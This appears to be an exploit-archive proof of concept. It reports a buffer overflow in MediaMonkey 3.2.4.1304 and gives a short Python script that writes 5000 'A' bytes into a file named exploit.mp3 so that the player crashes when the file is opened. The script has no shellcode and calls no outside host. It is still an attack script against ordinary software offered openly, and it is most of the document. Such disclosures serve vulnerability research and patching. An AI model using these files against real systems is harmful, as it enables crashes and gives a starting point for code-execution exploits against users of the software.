# Exploit Title: Mediamonkey 3.2.4.1304 (mp3) Buffer Overflow Vulnerability PoC
# Date: 12/04/2010
# Author: 0v3r
# Software Link: http://www.mediamonkey.com/download/?dir=download
# Version: 3.2.4.1304
# Tested on: Windows XP SP3 EN
# CVE: N/A


#!/usr/bin/python

buff = "\x41" * 5000 

try:
 	f = open("exploit.mp3",'w')
	f.write(buff)
	f.close()
	print "[-] File created!\n" 
except:
	print "[-] Error occured!\n" 